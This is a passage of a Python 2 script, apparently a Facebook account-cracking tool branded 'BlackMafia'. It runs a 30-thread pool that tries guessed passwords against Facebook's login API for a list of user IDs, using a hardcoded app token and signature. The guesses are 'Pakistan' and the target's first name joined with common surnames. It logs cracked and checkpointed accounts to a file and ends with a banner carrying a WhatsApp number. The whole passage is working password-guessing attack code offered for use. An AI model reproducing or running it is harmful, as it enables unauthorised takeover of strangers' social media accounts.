				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = a['first_name'] + 'rajpoot'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + 'mughal'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'malik'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + 'khan'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + 'afridi'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
	print "  \033[1;93m«---•◈•---Developed By love---•◈•---»" #Dev:love_hacker
	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
	print """
             
             ...........███ ]▄▄▄▄▄▃
             ..▂▄▅█████▅▄▃▂
             [███████████████]
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
♡──────────────•◈•──────────────♡.
: \033[1;96m .....lovehacker  BlackMafia........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp Num
               +923094161457"""
	
	raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
